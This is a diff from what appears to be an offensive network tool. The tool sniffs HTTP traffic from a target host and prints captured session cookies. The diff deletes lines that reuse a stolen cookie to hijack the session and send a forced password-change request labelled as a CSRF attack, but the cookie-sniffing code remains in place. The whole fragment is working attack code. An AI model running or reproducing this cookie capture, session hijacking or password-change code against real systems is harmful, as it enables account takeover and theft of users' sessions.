@@ -126,20 +126,6 @@ class Device:
                     if "Set-Cookie:" in raw_data:
                         cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
                         print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
-                        
-                        session = requests.Session()
-                        session.cookies.set('session', cookies)
-                        response = session.get(url)
-                        print(f"{Fore.CYAN}Hijacked Session Response: {response.status_code} {url}{Style.RESET_ALL}")
-                        
-                        csrf_url = f"{url}/change-password"
-                        csrf_data = {
-                            'old_password': 'password123',
-                            'new_password': 'newpassword456',
-                            'confirm_password': 'newpassword456'
-                        }
-                        csrf_response = session.post(csrf_url, data=csrf_data)
-                        print(f"{Fore.RED}CSRF Attack Attempted: {csrf_response.status_code} {csrf_url}{Style.RESET_ALL}")
 
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
